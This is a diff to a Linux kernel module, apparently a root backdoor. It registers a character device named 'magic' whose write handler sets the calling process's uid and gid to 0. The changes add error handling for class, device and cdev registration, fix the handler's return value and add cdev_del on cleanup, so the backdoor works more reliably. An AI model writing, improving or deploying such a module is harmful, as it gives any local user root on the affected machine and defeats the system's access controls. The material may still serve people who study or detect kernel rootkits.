@@ -30,7 +30,7 @@ ssize_t custom_write(struct file *f, const char __user *buf, size_t len, loff_t 
 	
 	if (root_cred == NULL) {
 		printk(KERN_INFO "Error\n");
-		return;
+		return len;
 	}
 	root_cred->uid.val = 0;
 	root_cred->gid.val = 0;
@@ -68,21 +68,36 @@ int init_module(void)
 
 	//register class
 	custom_class = class_create(THIS_MODULE, "magic");
+	if (IS_ERR(custom_class)) {
+		printk(KERN_ERR "Couldn't register class.\n");
+		unregister_chrdev_region(first, 1);
+		return PTR_ERR(custom_class);
+	}
 	custom_class->dev_uevent = permission_uevent;
-	//TODO error handler
 	
 	//register device
 	custom_dev = device_create(custom_class, NULL, first, NULL, "magic");
-	//TODO error handler
+	if (IS_ERR(custom_dev)) {
+		printk(KERN_ERR "Coudn't register device.\n");
+		class_destroy(custom_class);
+		unregister_chrdev_region(first, 1);
+		return PTR_ERR(custom_dev);
+	}
 
 	//init new device
 	cdev_init(&cdev, &fops);
-
 	cdev.owner = THIS_MODULE;
-	
 	//adding to kernel new device
-	cdev_add(&cdev, first, 1);
+	error = cdev_add(&cdev, first, 1);
 
+	if (error < 0) {
+		printk(KERN_ERR "Coudn't add new device.\n");
+		device_destroy(custom_class, first);
+		class_unregister(custom_class);
+		class_destroy(custom_class);
+		unregister_chrdev_region(first, 1);
+		return error;
+	}
 	return 0;
 }
 
@@ -90,6 +105,7 @@ void cleanup_module(void)
 {
 	printk(KERN_INFO "Root module ends.\n");
 
+	cdev_del(&cdev);
 	device_destroy(custom_class, first);
 	class_unregister(custom_class);
 	class_destroy(custom_class);
